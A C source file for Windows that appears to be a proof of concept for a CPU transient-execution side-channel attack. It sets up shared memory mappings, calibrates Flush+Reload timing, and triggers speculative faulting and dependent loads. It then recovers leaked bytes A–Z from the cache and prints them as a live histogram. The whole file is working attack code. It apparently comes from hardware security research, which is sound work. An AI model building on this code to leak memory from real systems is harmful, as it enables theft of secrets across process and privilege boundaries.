#define _GNU_SOURCE 1

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include <windows.h>
#include "cacheutils_win.h"

#define FROM 'A'
#define TO   'Z'

char __attribute__((aligned(4096))) mem[256 * 4096];
char __attribute__((aligned(4096))) mapping[4096];
char __attribute__((aligned(4096))) secret[4096 * 1024];
size_t hist[256];

void recover(void);

int main(int argc, char *argv[])
{
  /* Initialize and flush LUT */
  memset(mem, 0, sizeof(mem));

  for (size_t i = 0; i < 256; i++) {
    flush(mem + i * 4096);
  }

  /* Initialize mapping */
  memset(mapping, 0, 4096);

  // Calculate Flush+Reload threshold
  CACHE_MISS = detect_flush_reload_threshold();
  fprintf(stderr, "[+] Flush+Reload Threshold: %u\n", (int)CACHE_MISS);

  // Create shared memory mapping
  HANDLE hFile = CreateFileMapping((HANDLE) -1, NULL, PAGE_READWRITE, 0, 4096, "LBLEAK");
  if(hFile == NULL) {
    printf("[!] Create mapping failed\n");
    return 1;
  }
  
   char* map1 = MapViewOfFile(hFile, FILE_MAP_WRITE, 0, 0, 4096);
   char* map2 = MapViewOfFile(hFile, FILE_MAP_READ, 0, 0, 4096);
   
   map1[0] = 0;
   if(map2[0] != 0) {
    printf("[!] Could not create shared memory\n");
    return 1;
   }
   
   memset(secret, 'X', sizeof(secret));
 
  while (true) {
#if 0
    // enable to test leakage on same core
    for(int i = 0; i < 64 * 1024; i++) maccess(secret + i * 64);
    mfence();
#endif

    /* Flush mapping */
    flush(map1);

    /* Begin speculation and recover value */
    speculation_start(s);
        maccess(0);
        maccess(mem + 4096 * map2[0]);
    speculation_end(s);

    recover();
  }

  return 0;
}


void recover(void) {
    /* Recover value from cache and update histogram */
    bool update = false;
    for (size_t i = FROM; i <= TO; i++) {
      if (flush_reload((char*) mem + 4096 * i)) {
        hist[i]++;
        update = true;
      }
    }

    /* Redraw histogram on update */
    if (update == true) {
        system("cls");

        int max = 1;

        for (int i = FROM; i <= TO; i++) {
          if (hist[i] > max) {
            max = hist[i];
          }
        }

        for (int i = FROM; i <= TO; i++) {
            printf("%c: (%4u) ", i, (unsigned int)hist[i]);
            for (int j = 0; j < hist[i] * 60 / max; j++) {
              printf("#");
            }
            printf("\n");
        }

        fflush(stdout);
    }    
}
